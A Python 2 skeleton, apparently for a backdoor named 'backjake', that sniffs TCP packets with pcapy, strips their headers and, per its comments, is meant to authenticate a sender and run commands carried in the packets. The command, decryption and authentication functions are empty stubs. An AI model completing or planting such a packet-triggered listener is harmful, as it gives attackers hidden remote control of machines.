import socket
from struct import *
import sys
import threading
import pcapy
import config
import backjake

def endProgram():
	print "endProgram"


def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	cap.setfilter('tcp')

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()
	print "Listen thread start!"

def packetHandler(packet):
	ip, tcp, data = stripPacket(packet)

	# if (authenticated(packet))
		# run command
	# else
		# attempt to authenticate

def stripPacket(packet):
	ethLength = 14
	ipLength = 20

	eth  = packet[:ethLength] # 14 is the ethernet header length
	ethHeader = unpack('!6s6sH', eth)

	ip   = packet[ethLength:ipLength+ethLength]  # start from after ethernet, go 20 characters
	ipHeader = unpack('!BBHHHBBH4s4s', ip)
	
	tcp  = packet[ipLength+ethLength:ipLength+ethLength+20] # start from after tcp, go 20 characters
	tcpHeader = unpack('!HHLLBBHHH', tcp)
	temp = tcpHeader[4]
	tcpLength = temp >> 4
	
	data = packet[ipLength+ethLength+tcpLength*4:]
	return ipHeader, tcpHeader, data

def printPacket():
	print "printPacket"


def decryptPacket():
	print "decryptPacket"


def runCommand():
	print "runCommand"


def authenitcated():
	print "authenitcated"


def printInHex():
	print "printInHex"


def authenticateClient():
	print "authenticateClient"


def executeCommand():
	print "executeCommand"


def endProgram():
	print "endProgram"

